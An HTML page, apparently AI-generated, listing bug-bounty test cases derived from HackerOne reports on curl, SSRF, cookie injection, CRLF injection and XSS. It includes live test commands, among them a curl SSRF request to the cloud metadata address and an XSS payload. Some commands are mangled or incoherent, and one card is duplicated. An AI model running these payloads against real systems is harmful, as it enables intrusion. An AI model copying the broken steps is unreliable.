<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Bug Bounty Test Case Library</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #0b0e17;
      --panel: #141a2a;
      --card: #1d2438;
      --text: #f2f5ff;
      --muted: #94a3b8;
      --accent: #66d9ef;
      --accent-2: #f78c6c;
      --impact: #ffcb6b;
      --border: #2c3654;
      --shadow: 0 10px 30px rgba(0,0,0,0.3);
      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
    }
    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
    }
    .shell {
      width: 100%;
      max-width: none;
      margin: 0 auto;
      padding: 30px 5% 60px;
      box-sizing: border-box;
    }
    header {
      text-align: center;
      margin-bottom: 30px;
    }
    header h1 {
      font-size: 2.2rem;
      margin-bottom: 10px;
    }
    header p {
      color: var(--muted);
      margin: 0 auto;
      max-width: 780px;
      line-height: 1.5;
    }
    .top-row {
      display: flex;
      flex-wrap: wrap;
      gap: 18px;
      margin-bottom: 20px;
    }
    .metric {
      flex: 1 1 220px;
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 18px;
      box-shadow: var(--shadow);
    }
    .metric h2 {
      margin: 0 0 10px;
      font-size: 1rem;
      color: var(--muted);
      letter-spacing: 1px;
      text-transform: uppercase;
    }
    .metric-value {
      font-size: 2.6rem;
      font-weight: 700;
      color: var(--accent);
    }
    .filters {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 20px 15px;
      box-shadow: var(--shadow);
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
      align-items: flex-end;
      margin-bottom: 20px;
    }
    .filters label {
      display: block;
      font-size: 0.85rem;
      color: var(--muted);
      margin-bottom: 6px;
    }
    .filters input,
    .filters select {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 8px;
      color: var(--text);
      padding: 10px 12px;
      min-width: 220px;
      font-size: 1rem;
    }
    .analytics-panel {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 20px 15px;
      box-shadow: var(--shadow);
      margin-bottom: 25px;
    }
    .analytics-panel h2 {
      margin: 0 0 12px;
      font-size: 1.2rem;
    }
    .analytics-row {
      margin-bottom: 12px;
    }
    .analytics-label {
      display: flex;
      justify-content: space-between;
      font-size: 0.95rem;
      margin-bottom: 6px;
    }
    .analytics-bar {
      width: 100%;
      height: 10px;
      background: var(--card);
      border-radius: 999px;
      overflow: hidden;
    }
    .analytics-bar-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--accent), var(--accent-2));
    }
    .cards {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .card {
      background: var(--panel);
      border-radius: 14px;
      border: 1px solid var(--border);
      box-shadow: var(--shadow);
      overflow: hidden;
    }
    .card-toggle {
      width: 100%;
      background: transparent;
      border: none;
      color: inherit;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 18px 20px;
      font-size: 1.05rem;
      cursor: pointer;
      gap: 12px;
    }
    .card-toggle:focus-visible {
      outline: 2px solid var(--accent);
      outline-offset: 2px;
    }
    .card-title {
      font-weight: 600;
      text-align: left;
    }
    .card-meta-mini {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .badge {
      background: rgba(102, 217, 239, 0.15);
      color: var(--accent);
      border: 1px solid rgba(102, 217, 239, 0.4);
      border-radius: 999px;
      padding: 4px 12px;
      font-size: 0.8rem;
      white-space: nowrap;
    }
    .chevron {
      display: inline-block;
      transition: transform 0.2s ease;
    }
    .card.open .chevron {
      transform: rotate(90deg);
    }
    .card-body h1,
    .card-body h2,
    .card-body h3 {
      margin-top: 20px;
      margin-bottom: 10px;
    }
    .card-body p {
      margin: 0 0 10px;
      line-height: 1.5;
    }
    .card-body ul,
    .card-body ol {
      padding-left: 22px;
      margin: 0 0 12px;
    }
    .card-body li {
      margin-bottom: 6px;
    }
    .card-body code {
      background: rgba(255, 255, 255, 0.08);
      padding: 2px 5px;
      border-radius: 4px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.9em;
    }
    pre {
      background: rgba(0,0,0,0.3);
      padding: 12px;
      border-radius: 10px;
      overflow-x: auto;
      font-family: 'JetBrains Mono', monospace;
    }
    .card-meta {
      display: flex;
      justify-content: space-between;
      font-size: 0.85rem;
      color: var(--muted);
      border-top: 1px solid var(--border);
      padding-top: 12px;
      margin-top: 15px;
      flex-wrap: wrap;
      gap: 10px;
    }
    .card-body {
      max-height: 0;
      overflow: hidden;
      opacity: 0;
      padding: 0 20px;
      transition: max-height 0.3s ease, opacity 0.25s ease, padding 0.25s ease;
    }
    .card.open .card-body {
      max-height: 1200px;
      opacity: 1;
      padding: 0 20px 20px;
    }
    .section-heading {
      display: inline-block;
      margin-right: 6px;
      font-weight: 700;
      letter-spacing: 0.02em;
      color: var(--impact);
    }
    .status-line {
      font-size: 0.9rem;
      color: var(--muted);
      margin-bottom: 15px;
    }
    @media (max-width: 640px) {
      .filters input, .filters select {
        width: 100%;
      }
      .card-meta {
        flex-direction: column;
        align-items: flex-start;
      }
      .chart-wrapper {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="shell">
    <header>
      <h1>Reusable HackerOne Test Cases</h1>
      <p>Every report from HackerOne is analysed by local AI (Ollama) and generic test case has been derrived to be used as a checklist to test other websites.</p>
    </header>

    <section class="top-row">
      <div class="metric">
        <h2>Total Test Cases</h2>
        <div class="metric-value">40</div>
      </div>
      <div class="metric">
        <h2>Last Updated</h2>
        <div class="metric-value">2025-12-26</div>
      </div>
    </section>

    <section class="analytics-panel">
      <h2>Category Breakdown</h2>
      
    <div class="analytics-row">
      <div class="analytics-label">Web App <span>20</span></div>
      <div class="analytics-bar">
        <div class="analytics-bar-fill" style="width:100%"></div>
      </div>
    </div>
    

    <div class="analytics-row">
      <div class="analytics-label">API <span>15</span></div>
      <div class="analytics-bar">
        <div class="analytics-bar-fill" style="width:75%"></div>
      </div>
    </div>
    

    <div class="analytics-row">
      <div class="analytics-label">Network <span>5</span></div>
      <div class="analytics-bar">
        <div class="analytics-bar-fill" style="width:25%"></div>
      </div>
    </div>
    
    </section>

    <section class="filters">
      <div>
        <label for="searchInput">Keyword Search</label>
        <input type="text" id="searchInput" placeholder="Search summaries, steps, payloads..."/>
      </div>
      <div>
        <label for="categoryFilter">Category</label>
        <select id="categoryFilter">
          <option value="all">All Categories (40)</option>
          <option value="Web App">Web App (20)</option>
<option value="API">API (15)</option>
<option value="Network">Network (5)</option>
        </select>
      </div>
    </section>

    <p class="status-line">Tap any card to expand the full test case.</p>

    <section class="cards" id="cardContainer">
      
    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Heap Buffer Over-Read via Malicious SMB Response</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A malicious server can trigger a heap buffer over-read in a client application when responding to a specific SMB request, potentially disclosing sensitive information. This occurs because the client&#x27;s parsing of the response does not adequately validate the data offset, leading to an out-of-bounds read.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Set up a malicious SMB server using a provided script (e.g., <code>smb<em>exploit</em>server.py</code>) on a specific port (e.g., 4455).</li>
<li>Configure a client application (e.g., <code>curl</code>) to connect to the malicious server using a specified URL (e.g., <code>smb://&lt;TARGET_URL&gt;:4455/share/file.txt</code>).  Use dummy credentials (e.g., <code>-u anyuser:anypass</code>).</li>
<li>Initiate a file transfer using the client application.</li>
<li>Verify the size of the received data. The expected size should be larger than the amount of legitimate data sent by the server.</li>
<li>Examine the contents of the received data to identify leaked heap memory. A payload such as <code>AAAAAAAAAAAAAAAA</code> can be sent from the server to more easily identify the heap leak.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Potential disclosure of sensitive information, including authentication credentials, session tokens, and memory layout, which could be used for further exploitation.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation within the SMB parsing logic to ensure data offsets are within the boundaries of the expected response structure. Specifically, verify the offset against the message layout and byte count.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Public Suffix Cookie Injection</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability occurs when a web application or library doesn&#x27;t properly validate the Domain attribute in <code>Set-Cookie</code> headers. Attackers can use this to inject cookies that are inadvertently sent to other domains sharing the same public suffix, potentially leading to session hijacking or other malicious actions. Improper configuration or build options can exacerbate the problem.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Build a tool or library that handles HTTP cookies without public suffix validation (e.g., <code>./configure --disable-shared --without-libpsl &amp;&amp; make -j</code>).</li>
<li>Start a local HTTP server that sets a <code>Set-Cookie</code> header with a malicious <code>Domain</code> attribute (e.g., <code>Set-Cookie: sess=attack; Domain=.co.uk; Path=/</code>).</li>
<li>Use the vulnerable tool/library to retrieve the cookie from the malicious server using a specific hostname (e.g., <code>curl -v --resolve attacker.co.uk:8000:127.0.0.1 http://attacker.co.uk:8000/ -c /tmp/cjar2</code>).</li>
<li>Reuse the retrieved cookie jar with a different hostname (e.g., <code>curl -v --resolve victim.co.uk:8000:127.0.0.1 http://victim.co.uk:8000/ -b /tmp/cjar2</code>).</li>
<li>Verify that the cookie is sent to the second hostname. Example payload: <code>Domain=.co.uk</code>.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker can inject cookies and have them sent to unrelated domains, potentially leading to session hijacking, session fixation, or other forms of request poisoning.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Always validate the <code>Domain</code> attribute of <code>Set-Cookie</code> headers against a list of public suffixes. Use libraries or functions that provide this validation automatically. Ensure all tools and libraries are configured correctly, including necessary dependencies.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">CRLF Injection in Gopher Protocol</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from improper handling of newline characters within the Gopher protocol, allowing attackers to inject arbitrary commands. Exploitation can lead to unauthorized access and control of internal services, potentially resulting in remote code execution or data breaches.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Set up a listener on a specific port to receive incoming commands: <code>nc -lvnp &lt;PORT&gt;</code></li>
<li>Construct a Gopher URL containing URL-encoded CRLF characters to inject commands: <code>./curl &quot;gopher://&lt;TARGET<em>URL&gt;:&lt;PORT&gt;/</em>Dummy%0d%0a&lt;PAYLOAD&gt;%0d%0&quot;</code></li>
<li>Observe the output on the listener. The listener should receive multiple commands instead of a single line. For example, <code><em>Dummy%0d%0aHELLO</em>SERVER%0d%0</code> should appear as three separate lines.</li>
<li>Verify that the injected <code>&lt;PAYLOAD&gt;</code> is correctly interpreted and executed by the receiving service.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Allows attackers to interact with internal text-based protocols, potentially enabling remote code execution, SMTP injection, or bypassing security controls.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and sanitization for all incoming data within the Gopher protocol handler, ensuring that newline characters are properly handled and cannot be exploited to inject arbitrary commands.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Tab Nabbing</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> Tab nabbing is a type of attack where a newly opened tab can redirect the user&#x27;s original tab to a malicious website, often mimicking a legitimate page. This can be used for phishing attacks to steal user credentials or redirect users to harmful content. The vulnerability arises when a page opens in a new tab without proper safeguards against external manipulation.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Open a web application that allows links to open in new tabs (target=&quot;_blank&quot;).</li>
<li>Open a link in a new tab.</li>
<li>Open the browser&#x27;s developer console.</li>
<li>Execute the following JavaScript code in the console: <code>window.opener.location=&#x27;http://&lt;TARGET_URL&gt;&#x27;</code> (Example: <code>window.opener.location=&#x27;http://example.com&#x27;</code>)</li>
<li>Observe if the original tab redirects to the specified URL.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Users may be redirected to a malicious website without their knowledge, potentially leading to credential theft or other harmful actions.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Always implement strict content security policies (CSP) and avoid using <code>window.opener</code> unless absolutely necessary. If it is needed, sanitize and validate the target URL carefully to prevent redirection to unintended or malicious locations.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Connection Reuse Leads to IP Spoofing and mTLS Context Smuggling</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to hijack an authenticated connection, potentially bypassing access controls and impersonating a higher-privileged user. It occurs due to improper connection reuse where the client IP specified for the connection is not persisted and is therefore reused for subsequent requests.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Establish a secure connection to &lt;TARGET<em>URL&gt; using a specific client IP address <code>&lt;PAYLOAD&gt; curl --haproxy-client-ip 10.0.0.1 &lt;TARGET</em>URL&gt;</code>.</li>
<li>Immediately after the first request, send a second request to the same &lt;TARGET<em>URL&gt; without specifying a client IP address or with a different client IP address <code>&lt;PAYLOAD&gt; curl &lt;TARGET</em>URL&gt;</code>.</li>
<li>Monitor the server-side logs to confirm that the second request is attributed to the IP address of the initial connection (10.0.0.1 in the example) rather than the IP address of the second request.</li>
<li>If the target utilizes mTLS, verify that the second request inherits the TLS context of the initial connection.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong>  An attacker can bypass access controls, impersonate privileged users, and potentially gain unauthorized access to resources or data. This leads to integrity and confidentiality compromises.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that the client IP is stored and verified during connection reuse.  Implement robust connection management that respects client-provided identity information, preventing the accidental reuse of connections with mismatched identities.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Network">
      <button type="button" class="card-toggle">
        <span class="card-title">WebSocket Handshake Spoofing</span>
        <span class="card-meta-mini">
          <span class="badge">Network</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This issue describes a vulnerability where a WebSocket client fails to properly validate the <code>Sec-WebSocket-Accept</code> header during the handshake process. This can allow an attacker to inject malicious frames into the WebSocket connection, leading to potential data manipulation or protocol confusion. The client accepts a server’s response even when the <code>Sec-WebSocket-Accept</code> is incorrect.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Build a WebSocket client library from source, disabling SSL and other dependencies as needed.</li>
<li>Set up a TCP server that responds with a WebSocket 101 response containing a deliberately incorrect <code>Sec-WebSocket-Accept</code> header and a text frame. For example: <code>HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: WRONGKEY\r\n\r\n</code>.</li>
<li>Run the WebSocket client against the server at <code>&lt;TARGET_URL&gt;</code> using the client’s built-in example or a similar test script.</li>
<li>Observe if the client successfully receives and processes the text frame despite the incorrect <code>Sec-WebSocket-Accept</code> value. The expected behavior is that the handshake should fail. Example payload: <code>ws://&lt;TARGET_URL&gt;/</code>.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker can inject malicious WebSocket frames without proper authentication, leading to data injection or protocol confusion. This violates WebSocket handshake integrity and exposes clients to potential compromise.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict validation of the <code>Sec-WebSocket-Accept</code> header during WebSocket handshake processing. Ensure the server-provided value matches the client’s calculated value. Follow RFC 6455 guidelines closely for WebSocket handshake implementation.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Blind SSRF via SMTP Header</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to trigger Server-Side Request Forgery (SSRF) by manipulating the <code>List-Unsubscribe</code> header in an SMTP email. The server then makes a request to a URL specified within this header, potentially accessing internal resources. The vulnerability exists when local and remote server connections are allowed.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Configure the target application to allow local and remote SMTP servers.</li>
<li>Craft an email with a manipulated <code>List-Unsubscribe</code> header containing a URL pointing to an internal resource. Example: <code>List-Unsubscribe: &lt;http://internal.example.com/sensitive_data&gt;</code></li>
<li>Send the email to a valid recipient within the target application.</li>
<li>Observe the server’s response and network traffic to confirm the request to <code>&lt;http://internal.example.com/sensitive_data&gt;</code> was made.</li>
<li>Use a timing-based SSRF technique like <code>List-Unsubscribe: &lt;http://&lt;TARGET_URL&gt;/slowloris.php&gt;</code> to identify internal services.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially access internal resources, read sensitive data, or interact with internal services without proper authorization.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Disable or restrict the ability to use local and remote SMTP servers. Validate and sanitize all user-supplied data within email headers, particularly the <code>List-Unsubscribe</code> header. Implement strict network segmentation and access controls.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Link Unfurling SSRF via Link-Local Addresses</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> The application allows users to provide a URL for link unfurling, fetching metadata from the given URL. Due to insufficient validation, link-local addresses are not blocked, leading to Server-Side Request Forgery (SSRF) vulnerabilities. This can allow authenticated users to access internal services or metadata.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Authenticate to the target application.</li>
<li>Send a POST request to the link unfurl endpoint with a link-local URL.</li>
<li>Use the following payload as an example:</li>
</ol>
<pre><code>curl -X POST &lt;TARGET_URL&gt;/unfurl_link -H &quot;Cookie: &lt;COOKIE_VALUE&gt;&quot; -H &quot;X-CSRF-Token: &lt;CSRF_TOKEN&gt;&quot; -d &#x27;url=http://169.254.169.254/latest/meta-data/&#x27;</code></pre>
<ol>
<li>Observe if the application fetches data from the link-local address.  Verify that the response contains data from the targeted link-local resource.</li>
<li>Repeat the test with other link-local addresses like <code>fe80::/10</code>.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An authenticated attacker can potentially access internal services, cloud metadata, or other sensitive resources that are only accessible within the internal network.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter URL validation to explicitly block link-local addresses (169.254.0.0/16 and fe80::/10) during URL resolution. Use a robust private network guard that includes link-local address checks.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Digest Authentication Parsing Regression: Whitespace and Escaped Quotes</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A flaw in how Digest authentication headers are parsed can lead to authentication failures or fallback to weaker authentication methods. Malicious servers can craft RFC-compliant headers containing unexpected whitespace or escaped quotes to exploit this, potentially causing denial-of-service or bypassing authentication.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Set up an API server or listener at <code>&lt;TARGET_URL&gt;</code> that returns the following <code>WWW-Authenticate</code> header:</li>
<li>Send a request to <code>&lt;TARGET<em>URL&gt;</code> using a tool like <code>curl</code> with Digest authentication enabled: <code>curl --digest -u &lt;USERNAME&gt;:&lt;PASSWORD&gt; &lt;TARGET</em>URL&gt;</code></li>
<li>Observe if the authentication fails, or if parameters are incorrectly parsed.</li>
<li>Repeat the test with a <code>WWW-Authenticate</code> header including a space after the comma: <code>WWW-Authenticate: Digest realm=&quot;test&quot;, nonce=&quot;xyz&quot;</code></li>
<li>Repeat the test with an escaped quote inside the realm attribute: <code>WWW-Authenticate: Digest realm=&quot;My \&quot;Cool\&quot; Realm&quot;, nonce=&quot;xyz&quot;</code></li>
<li>Verify that the response indicates authentication failure or incorrect parameter parsing.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Authentication failures, fallback to weaker authentication schemes, or potential bypass of authentication mechanisms.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure proper handling of optional whitespace and escaped quotes when parsing <code>WWW-Authenticate</code> headers. Adhere to RFC specifications for header parsing and use well-tested libraries.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Unbounded Memory Consumption during Decompression</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability occurs when an application, like curl, processes compressed HTTP responses (gzip, brotli, or zstd) without limiting the size of the uncompressed data. A malicious server can exploit this by sending a small compressed file that expands to a very large size when decompressed, potentially leading to denial-of-service. The issue stems from the lack of safeguards against excessive memory usage during decompression.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Send a compressed HTTP response from a server using a content encoding like <code>gzip</code>, <code>brotli</code>, or <code>zstd</code>. The compressed data should be relatively small in size.</li>
<li>Use a tool like <code>curl</code> to retrieve the response: <code>curl -s &lt;TARGET_URL&gt;</code></li>
<li>Monitor the memory usage of the process handling the decompression. Observe if memory consumption grows significantly beyond what is expected based on the size of the compressed data.</li>
<li>An example payload could be a specially crafted, small compressed PDF file designed to expand significantly upon decompression.  <code>&lt;PAYLOAD&gt;</code> could be the contents of this crafted file.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Denial of service due to excessive memory consumption, potentially crashing the application or impacting system stability.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement a maximum limit on the size of the uncompressed data during decompression and halt the process if the limit is exceeded.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Environment Variable Truncation in Proxy Handling</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A flaw exists where excessively long protocol schemes can lead to truncation of environment variable names used for proxy configuration. This can cause unexpected proxy behavior as curl might read configuration from unintended, truncated environment variables. This potentially exposes applications to incorrect proxy settings and bypasses security policies.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Set a protocol scheme longer than 12 characters in a URL, for example, <code>&lt;TARGET_URL&gt;?scheme=extremelylongprotocolname</code>.</li>
<li>Observe the environment variable name constructed for proxy configuration.</li>
<li>Check if the environment variable name is truncated. For instance, <code>extremelylongprotocolname</code> might become <code>extremelylongsc</code>.</li>
<li>Use a command line tool, like <code>curl</code> with a custom scheme, to trigger the vulnerability: <code>curl -x &lt;PROXY<em>URL&gt; -H &quot;Proxy-Scheme: extremelylongprotocolname&quot; &lt;TARGET</em>URL&gt;</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Incorrect proxy configuration, potential proxy bypass, and unexpected network behavior due to the reading of unintended environment variables.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Increase the buffer size for environment variable name construction to accommodate longer protocol scheme names. Implement validation to ensure that generated environment variable names do not exceed a maximum length.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Heap Buffer Over-Read via Malicious SMB Response</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A maliciously crafted response from an SMB server can trigger a heap buffer over-read in a client using a vulnerable version of libcurl. This leads to information disclosure, potentially exposing sensitive data like authentication credentials or API keys. The vulnerability stems from an incorrect bounds check during the processing of SMB READ_ANDX responses.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Configure an SMB server to send a specially crafted response containing a large claimed message size.</li>
<li>Use a vulnerable version of curl (e.g., 8.15.0) to connect to the SMB server and request a file: <code>curl -u anyuser:anypass -o leaked.bin smb://&lt;TARGET_URL&gt;/share/file.txt</code></li>
<li>Verify the output file size: <code>ls -la leaked.bin</code>. The size should be significantly larger than the actual data sent by the server.</li>
<li>Inspect the contents of the output file using a hex editor or <code>xxd</code>: <code>xxd leaked.bin | head -20</code>. The output should show the expected data followed by heap memory content.</li>
<li>The attacker can set <code>data<em>offset</code> and <code>data</em>length</code> to read from any position within the receive buffer.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Exposure of heap memory potentially containing sensitive information such as authentication tokens, API keys, or other private data. This could lead to account compromise and further exploitation.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter bounds checking when processing SMB responses.  Ensure that offsets are validated against the expected message layout and size of the response data. The byte_count field needs to be used and not just the total received bytes.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Improper Authentication Tag Length Validation in Ciphertext Decryption</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from a failure to properly validate the length of the authentication tag during ciphertext decryption. The API documentation suggests a default tag length, but the implementation does not enforce this, allowing for shorter, truncated tags. This enables an attacker to potentially recover the encryption key and forge valid ciphertexts.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Utilize the <code>createCipheriv</code> and <code>createDecipheriv</code> functions with a specified algorithm, such as <code>&lt;ALGORITHM&gt;</code>.</li>
<li>Initialize a cipher object with a key and nonce: <code>key = &#x27;&lt;KEY&gt;&#x27;; nonce = &#x27;&lt;NONCE&gt;&#x27;</code>.</li>
<li>Encrypt a plaintext message: <code>plaintext = &#x27;&lt;PLAINTEXT&gt;&#x27;</code>.</li>
<li>Obtain the authentication tag: <code>tag = cipher.getAuthTag()</code>.</li>
<li>Initialize a decipher object with the same key and nonce.</li>
<li>Attempt decryption using a truncated authentication tag: <code>decipher.setAuthTag(tag.subarray(0, &lt;TAG<em>LENGTH&gt;));</code> where <code>&lt;TAG</em>LENGTH&gt;</code> is less than the expected default value (e.g., 4, 8, 12).</li>
<li>If the decryption is successful, it indicates a vulnerability.</li>
<li>Example payload: <code>const key = &#x27;key0123456789key&#x27;; const nonce = &#x27;123456789012&#x27;; decipher.setAuthTag(tag.subarray(0, 4));</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker could potentially decrypt ciphertexts without the full authentication tag, recover the encryption key, and forge valid ciphertexts, leading to data breaches and unauthorized access.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement rigorous validation of the authentication tag length during decryption. Ensure that the tag length matches the expected value as defined in the API documentation and handle invalid tag lengths appropriately. Enforce the documented tag length.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Reflected XSS</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious scripts into a web application via a crafted URL. This can lead to session hijacking, defacement, or redirection to malicious sites. The issue arises when user-supplied data is not properly sanitised before being included in the response.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Construct a URL using the following pattern: <code>&lt;TARGET_URL&gt;?targetURL=&lt;PAYLOAD&gt;</code></li>
<li>Replace <code>&lt;PAYLOAD&gt;</code> with a script injection payload, for example: <code>&quot;%22);alert(document.domain);//</code></li>
<li>Access the crafted URL in a web browser.</li>
<li>Observe if the injected script executes, indicating successful XSS.</li>
</ol>

